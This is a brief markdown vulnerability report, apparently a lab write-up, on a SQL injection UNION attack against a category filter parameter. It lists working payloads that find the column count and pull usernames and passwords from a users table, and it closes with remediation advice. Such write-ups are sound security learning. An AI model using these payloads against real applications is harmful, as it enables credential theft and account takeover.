# Vulnerability Report — SQL Injection UNION Attack, Retrieving Data from Other Tables

## 1. Vulnerability Overview
- **Name:** SQL Injection UNION Attack
- **Severity:** Critical
- **Location:** /filter?category=
- **Tool Used:** Burp Suite Repeater

## 2. Description
SQL Injection allows an attacker to use UNION SELECT
to retrieve and display data from another database
table. After determining the number of columns and
identifying text-compatible columns, the attacker
can extract sensitive data such as usernames and
passwords from the users table.

## 3. Steps to Reproduce
1. Determine column count:
   ' ORDER BY 2-- ✅ → 2 columns
2. Confirm with NULL:
   ' UNION SELECT NULL,NULL-- ✅
3. Retrieve data from users table:
   ' UNION SELECT username,password FROM users--
4. Usernames and passwords appear in the response ✅

## 4. Evidence
 <img width="1627" height="892" alt="Screenshot 2026-08-18 215306" src="https://github.com/user-attachments/assets/a8b6afa1-215a-4005-a8ec-03382120cd21" />
<img width="1912" height="1026" alt="Screenshot 2026-08-18 215448" src="https://github.com/user-attachments/assets/9014c16a-ef82-406d-99da-0a13dc8f5938" />
<img width="1919" height="1021" alt="Screenshot 2026-08-18 215518" src="https://github.com/user-attachments/assets/7a19198d-1a4f-4075-a4ab-57e5604735a1" />
<img width="1893" height="1019" alt="Screenshot 2026-08-18 215739" src="https://github.com/user-attachments/assets/f708a75c-d70a-4b48-ad1e-8e342038dc8c" />

## 5. Impact
An attacker can retrieve all usernames and passwords
from the database leading to complete account takeover
of all users including administrators.

## 6. Remediation
- Use parameterized queries (Prepared Statements)
- Never concatenate user input into SQL queries
- Implement input validation and WAF rules
- Use an ORM (Object Relational Mapper)
